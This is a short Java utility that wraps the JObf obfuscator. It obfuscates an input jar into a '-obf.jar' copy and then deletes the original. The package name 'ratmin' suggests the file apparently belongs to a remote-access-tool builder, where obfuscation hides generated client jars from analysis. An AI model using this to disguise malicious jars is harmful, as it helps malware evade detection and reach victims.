package me.slimig.ratmin.utils;

import me.superblaubeere27.jobf.JObf;
import me.superblaubeere27.jobf.JObfImpl;
import me.superblaubeere27.jobf.utils.values.Configuration;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

public class Obfuscator {

    public static void startObfuscator(String infile) {
//      impl.loadConfig(config);

        File in = new File(infile);

        if (!in.exists()) {
            // error
            return;
        }
        List<String> libraries = new ArrayList<>();
        String scriptContent = "";

        Configuration config = new Configuration(infile, infile.replace(".jar", "") + "-obf.jar", scriptContent,
                libraries);
        JObfImpl impl = new JObfImpl();

        JObf.VERBOSE = false;

        impl.setThreadCount(6);

        try {
            impl.processJar(config);
        } catch (IOException e) {
            e.printStackTrace();
        }
        File obfoutput = new File(infile);
        if (obfoutput.exists()) {
            obfoutput.delete();
        }
    }
}
